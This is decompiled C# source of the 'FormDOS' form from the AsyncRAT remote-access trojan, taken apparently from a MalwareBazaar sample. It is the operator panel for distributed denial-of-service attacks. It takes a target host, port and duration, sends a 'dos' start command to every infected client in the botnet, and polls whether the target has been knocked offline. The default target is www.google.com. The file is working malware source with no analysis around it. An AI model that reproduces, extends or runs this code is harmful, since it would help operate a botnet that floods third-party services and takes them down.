// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormDOS
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormDOS : Form
  {
    private TimeSpan timespan;
    private Stopwatch stopwatch;
    private string status = "is online";
    public object sync = new object();
    public List<Clients> selectedClients = new List<Clients>();
    public List<Clients> PlguinClients = new List<Clients>();
    private IContainer components;
    private GroupBox groupBox1;
    private Label label2;
    private Label label1;
    private TextBox txtPort;
    private TextBox txtHost;
    private GroupBox groupBox2;
    private Label label4;
    private Label label3;
    private TextBox txtTimeout;
    private GroupBox groupBox3;
    private Button btnStop;
    private Button btnAttack;
    private System.Windows.Forms.Timer timer1;
    private System.Windows.Forms.Timer timer2;

    public FormDOS() => this.InitializeComponent();

    private void BtnAttack_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text))
        return;
      if (string.IsNullOrWhiteSpace(this.txtTimeout.Text))
        return;
      try
      {
        if (!this.txtHost.Text.ToLower().StartsWith("http://"))
          this.txtHost.Text = "http://" + this.txtHost.Text;
        Uri uri = new Uri(this.txtHost.Text);
      }
      catch
      {
        return;
      }
      if (this.PlguinClients.Count <= 0)
        return;
      try
      {
        this.btnAttack.Enabled = false;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "dos";
        msgPack.ForcePathObject("Option").AsString = "postStart";
        msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
        msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
        msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
        foreach (Clients plguinClient in this.PlguinClients)
        {
          this.selectedClients.Add(plguinClient);
          ThreadPool.QueueUserWorkItem(new WaitCallback(plguinClient.Send), (object) msgPack.Encode2Bytes());
        }
        this.btnStop.Enabled = true;
        this.timespan = TimeSpan.FromSeconds((double) (Convert.ToInt32(this.txtTimeout.Text) * 60));
        this.stopwatch = new Stopwatch();
        this.stopwatch.Start();
        this.timer1.Start();
        this.timer2.Start();
      }
      catch
      {
      }
    }

    private void BtnStop_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "dos";
        msgPack.ForcePathObject("Option").AsString = "postStop";
        foreach (Clients plguinClient in this.PlguinClients)
          ThreadPool.QueueUserWorkItem(new WaitCallback(plguinClient.Send), (object) msgPack.Encode2Bytes());
        this.selectedClients.Clear();
        this.btnAttack.Enabled = true;
        this.btnStop.Enabled = false;
        this.timer1.Stop();
        this.timer2.Stop();
        this.status = "is online";
      }
      catch
      {
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.Text = string.Format("DOS ATTACK:{0}    Status:host {1}", (object) this.timespan.Subtract(TimeSpan.FromSeconds((double) this.stopwatch.Elapsed.Seconds)), (object) this.status);
      if (!(this.timespan < this.stopwatch.Elapsed))
        return;
      this.btnAttack.Enabled = true;
      this.btnStop.Enabled = false;
      this.timer1.Stop();
      this.timer2.Stop();
      this.status = "is online";
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      try
      {
        WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
        this.status = "is online";
      }
      catch
      {
        this.status = "is offline";
      }
    }

    private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        foreach (Clients plguinClient in this.PlguinClients)
          plguinClient.Disconnected();
        this.PlguinClients.Clear();
        this.selectedClients.Clear();
      }
      catch
      {
      }
      this.Hide();
      this.Parent = (Control) null;
      e.Cancel = true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormDOS));
      this.groupBox1 = new GroupBox();
      this.label2 = new Label();
      this.label1 = new Label();
      this.txtPort = new TextBox();
      this.txtHost = new TextBox();
      this.groupBox2 = new GroupBox();
      this.label4 = new Label();
      this.label3 = new Label();
      this.txtTimeout = new TextBox();
      this.groupBox3 = new GroupBox();
      this.btnStop = new Button();
      this.btnAttack = new Button();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.timer2 = new System.Windows.Forms.Timer(this.components);
      this.groupBox1.SuspendLayout();
      this.groupBox2.SuspendLayout();
      this.groupBox3.SuspendLayout();
      this.SuspendLayout();
      this.groupBox1.Controls.Add((Control) this.label2);
      this.groupBox1.Controls.Add((Control) this.label1);
      this.groupBox1.Controls.Add((Control) this.txtPort);
      this.groupBox1.Controls.Add((Control) this.txtHost);
      this.groupBox1.Location = new Point(12, 12);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(596, 114);
      this.groupBox1.TabIndex = 0;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Target";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(415, 47);
      this.label2.Name = "label2";
      this.label2.Size = new Size(52, 20);
      this.label2.TabIndex = 2;
      this.label2.Text = "PORT";
      this.label1.AutoSize = true;
      this.label1.Location = new Point(17, 47);
      this.label1.Name = "label1";
      this.label1.Size = new Size(53, 20);
      this.label1.TabIndex = 2;
      this.label1.Text = "HOST";
      this.txtPort.Location = new Point(477, 44);
      this.txtPort.Name = "txtPort";
      this.txtPort.Size = new Size(70, 26);
      this.txtPort.TabIndex = 1;
      this.txtPort.Text = "80";
      this.txtHost.Location = new Point(79, 44);
      this.txtHost.Name = "txtHost";
      this.txtHost.Size = new Size(293, 26);
      this.txtHost.TabIndex = 1;
      this.txtHost.Text = "www.google.com";
      this.groupBox2.Controls.Add((Control) this.label4);
      this.groupBox2.Controls.Add((Control) this.label3);
      this.groupBox2.Controls.Add((Control) this.txtTimeout);
      this.groupBox2.Location = new Point(12, 146);
      this.groupBox2.Name = "groupBox2";
      this.groupBox2.Size = new Size(596, 102);
      this.groupBox2.TabIndex = 1;
      this.groupBox2.TabStop = false;
      this.groupBox2.Text = "Settings";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(178, 45);
      this.label4.Name = "label4";
      this.label4.Size = new Size(38, 20);
      this.label4.TabIndex = 5;
      this.label4.Text = "min.";
      this.label3.AutoSize = true;
      this.label3.Location = new Point(18, 45);
      this.label3.Name = "label3";
      this.label3.Size = new Size(80, 20);
      this.label3.TabIndex = 4;
      this.label3.Text = "TIMEOUT";
      this.txtTimeout.Location = new Point(109, 42);
      this.txtTimeout.Name = "txtTimeout";
      this.txtTimeout.Size = new Size(63, 26);
      this.txtTimeout.TabIndex = 3;
      this.txtTimeout.Text = "5";
      this.groupBox3.Controls.Add((Control) this.btnStop);
      this.groupBox3.Controls.Add((Control) this.btnAttack);
      this.groupBox3.Location = new Point(12, 282);
      this.groupBox3.Name = "groupBox3";
      this.groupBox3.Size = new Size(596, 100);
      this.groupBox3.TabIndex = 2;
      this.groupBox3.TabStop = false;
      this.groupBox3.Text = "Command";
      this.btnStop.Enabled = false;
      this.btnStop.Location = new Point(477, 35);
      this.btnStop.Name = "btnStop";
      this.btnStop.Size = new Size(107, 43);
      this.btnStop.TabIndex = 1;
      this.btnStop.Text = "Stop";
      this.btnStop.UseVisualStyleBackColor = true;
      this.btnStop.Click += new EventHandler(this.BtnStop_Click);
      this.btnAttack.Location = new Point(22, 35);
      this.btnAttack.Name = "btnAttack";
      this.btnAttack.Size = new Size(107, 43);
      this.btnAttack.TabIndex = 0;
      this.btnAttack.Text = "Attack";
      this.btnAttack.UseVisualStyleBackColor = true;
      this.btnAttack.Click += new EventHandler(this.BtnAttack_Click);
      this.timer1.Interval = 1000;
      this.timer1.Tick += new EventHandler(this.Timer1_Tick);
      this.timer2.Interval = 5000;
      this.timer2.Tick += new EventHandler(this.Timer2_Tick);
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(631, 408);
      this.Controls.Add((Control) this.groupBox3);
      this.Controls.Add((Control) this.groupBox2);
      this.Controls.Add((Control) this.groupBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormDOS);
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "DOS";
      this.FormClosing += new FormClosingEventHandler(this.FormDOS_FormClosing);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.groupBox2.ResumeLayout(false);
      this.groupBox2.PerformLayout();
      this.groupBox3.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
